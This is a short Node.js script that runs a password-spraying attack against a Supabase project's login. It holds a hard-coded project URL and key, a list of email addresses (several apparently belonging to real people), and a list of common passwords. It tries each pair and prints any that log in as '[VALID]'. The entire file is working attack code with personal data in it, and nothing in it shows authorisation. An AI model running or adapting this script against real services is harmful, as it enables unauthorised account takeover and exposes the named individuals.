const { createClient } = require('@supabase/supabase-js');
const client = createClient('https://tiuwfhkrjvtkshebdwlp.supabase.co', 'sb_publishable_YhLxIyNN7tsS2ixSnGfRUw_TF4EsRf-');

const emails = [
  'samridhtomar8@gmail.com',
  'deepak.soni19492@gmail.com',
  'poojagarg0885@gmail.com',
  'manager@bistro.local',
  'waiter@bistro.local',
  'cashier@bistro.local',
  'headchef@bistro.local',
  'dsoni1281@gmail.com'
];

const passwords = ['123456', 'Password123!', '12345678', 'password', 'bistro123', 'admin123', 'CleverOps123!'];

async function check() {
  for (const email of emails) {
    for (const pw of passwords) {
      try {
        const { data, error } = await client.auth.signInWithPassword({ email, password: pw });
        if (data?.user?.id) {
          console.log(`[VALID] ${email} -> ${pw}`);
          break;
        }
      } catch (e) {}
    }
  }
}

check();
